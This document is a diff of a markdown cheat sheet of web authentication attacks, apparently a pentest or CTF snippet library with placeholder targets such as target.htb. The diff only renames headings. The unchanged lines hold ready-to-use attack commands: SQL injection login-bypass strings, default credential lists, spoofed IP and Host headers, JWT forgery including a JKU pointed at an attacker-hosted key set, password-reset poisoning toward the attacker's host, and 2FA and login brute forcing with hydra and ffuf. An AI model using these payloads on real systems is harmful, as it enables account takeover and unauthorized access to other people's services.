@@ -6,7 +6,7 @@
 
 ---
 
-## Auth - Common Default Creds
+## try default creds
 Hammer the usual list before anything else.
 
 ```bash
@@ -17,7 +17,7 @@ echo -e "admin:admin\nadmin:password\nadmin:admin123\nroot:root\nroot:toor\nadmi
 
 ---
 
-## Auth - SQLi Login Bypass
+## bypass login sqli
 Drop directly into auth bypass list.
 
 ```bash
@@ -28,7 +28,7 @@ echo -e "admin' or 1=1-- -\nadmin'#\n' or 0=0 #\nadmin' or '1'='1\n\" or \"\"=\"
 
 ---
 
-## Auth - HTTP Verb Tampering
+## bypass auth verb tampering
 Try different verbs against the auth endpoint.
 
 ```bash
@@ -39,7 +39,7 @@ for m in POST PUT GET HEAD OPTIONS DELETE PATCH TRACE CONNECT; do echo -n "$m: "
 
 ---
 
-## Auth - X-Forwarded-For Trust
+## bypass IP allowlist X-Forwarded-For
 Bypass IP allowlists.
 
 ```bash
@@ -55,7 +55,7 @@ curl -s {{URL:url:http://target.htb/admin}} -H "X-Host: localhost"
 
 ---
 
-## Auth - Path Confusion
+## bypass auth path confusion
 Bypass via trailing chars / path normalization.
 
 ```bash
@@ -73,7 +73,7 @@ curl -s {{URL:url:http://target.htb}}//admin//
 
 ---
 
-## Auth - Host Header Override
+## bypass auth host header override
 Trick virtual host routing.
 
 ```bash
@@ -85,7 +85,7 @@ curl -s {{URL:url:http://target.htb/admin}} -H "X-Forwarded-Host: admin.target.h
 
 ---
 
-## Auth - Referer Trust
+## bypass auth referer trust
 Some apps gate by Referer header.
 
 ```bash
@@ -96,7 +96,7 @@ curl -s {{URL:url:http://target.htb/admin}} -H "Referer: http://target.htb/admin
 
 ---
 
-## Auth - JWT None Algorithm
+## forge JWT none algorithm
 Drop sig and set alg to none.
 
 ```bash
@@ -109,7 +109,7 @@ echo "<header_b64>.<payload_b64>."
 
 ---
 
-## Auth - JWT Secret Crack
+## crack JWT secret hs256
 Brute-force HS256 JWT signing secret.
 
 ```bash
@@ -120,7 +120,7 @@ hashcat -m 16500 {{JWT:str:eyJhbGciOi...}} {{WORDLIST:wordlist:/usr/share/wordli
 
 ---
 
-## Auth - JWT Algorithm Confusion (RS256 → HS256)
+## forge JWT algorithm confusion RS256 HS256
 Use public key as HMAC secret.
 
 ```bash
@@ -135,7 +135,7 @@ print(jwt.encode({'sub':'admin','role':'admin'}, key, algorithm='HS256'))
 
 ---
 
-## Auth - JWT kid Path Traversal
+## inject JWT kid path traversal
 Manipulate kid header for file inclusion.
 
 ```bash
@@ -146,7 +146,7 @@ echo '{"alg":"HS256","kid":"../../../../dev/null","typ":"JWT"}' | base64 -w0
 
 ---
 
-## Auth - JWT JKU/X5U Spoofing
+## spoof JWT jku x5u
 Point JKU to attacker JWKS.
 
 ```bash
@@ -157,7 +157,7 @@ echo '{"alg":"RS256","jku":"http://{{LHOST:ip}}:{{LPORT:port:8000}}/jwks.json","
 
 ---
 
-## Auth - Session Fixation Test
+## test session fixation
 Reuse same session ID before/after login.
 
 ```bash
@@ -170,7 +170,7 @@ diff <(grep -E "PHPSESSID|JSESSIONID|session" /tmp/cj1) /tmp/cj1
 
 ---
 
-## Auth - Predictable Token
+## brute predictable reset token
 Test if password reset/email tokens are predictable (timestamps, sequential).
 
 ```bash
@@ -181,7 +181,7 @@ for i in $(seq 1000 1100); do echo "Trying token=$i"; curl -s "{{URL:url:http://
 
 ---
 
-## Auth - Mass Assignment Privilege
+## exploit mass assignment privilege escalation
 Add role/admin field to signup.
 
 ```bash
@@ -192,7 +192,7 @@ curl -X POST {{URL:url:http://target.htb/signup}} -H "Content-Type: application/
 
 ---
 
-## Auth - Response Manipulation
+## bypass auth response manipulation
 Login then flip 401/403 to 200 in proxy.
 
 ```bash
@@ -203,7 +203,7 @@ echo "Burp -> Match-and-Replace: 'HTTP/1.1 401' -> 'HTTP/1.1 200', '\"isAdmin\":
 
 ---
 
-## Auth - 2FA Bypass: Skip Step
+## bypass 2FA skip step
 Try going directly to post-2FA endpoint after first factor.
 
 ```bash
@@ -214,7 +214,7 @@ curl -s -b /tmp/cj1 {{URL:url:http://target.htb/dashboard}}
 
 ---
 
-## Auth - 2FA Bypass: Code Reuse
+## bypass 2FA code reuse
 Replay last OTP — server may not invalidate.
 
 ```bash
@@ -225,7 +225,7 @@ curl -X POST {{URL:url:http://target.htb/2fa/verify}} -d "code={{CODE:str:123456
 
 ---
 
-## Auth - 2FA Bypass: Brute-Force No Lockout
+## brute 2FA no lockout
 6-digit code with no lockout.
 
 ```bash
@@ -236,7 +236,7 @@ for c in $(seq 0 999999); do code=$(printf "%06d" $c); resp=$(curl -s -o /dev/nu
 
 ---
 
-## Auth - Password Reset Host Header
+## poison password reset host header
 Hijack reset link via Host header poisoning.
 
 ```bash
@@ -247,7 +247,7 @@ curl -X POST {{URL:url:http://target.htb/forgot}} -H "Host: {{LHOST:ip}}" -d "em
 
 ---
 
-## Auth - OAuth state Missing / Predictable
+## exploit OAuth missing state
 Test for missing state param.
 
 ```bash
@@ -258,7 +258,7 @@ echo "{{URL:url:http://target.htb/oauth/callback?code=}}<attacker_code>"
 
 ---
 
-## Auth - Login Brute (hydra)
+## brute login hydra http form
 Hydra against HTTP form login.
 
 ```bash
@@ -269,7 +269,7 @@ hydra -L {{USERLIST:wordlist:users.txt}} -P {{WORDLIST:wordlist:/usr/share/wordl
 
 ---
 
-## Auth - Login Brute (ffuf)
+## brute login ffuf
 ffuf with status code filter.
 
 ```bash
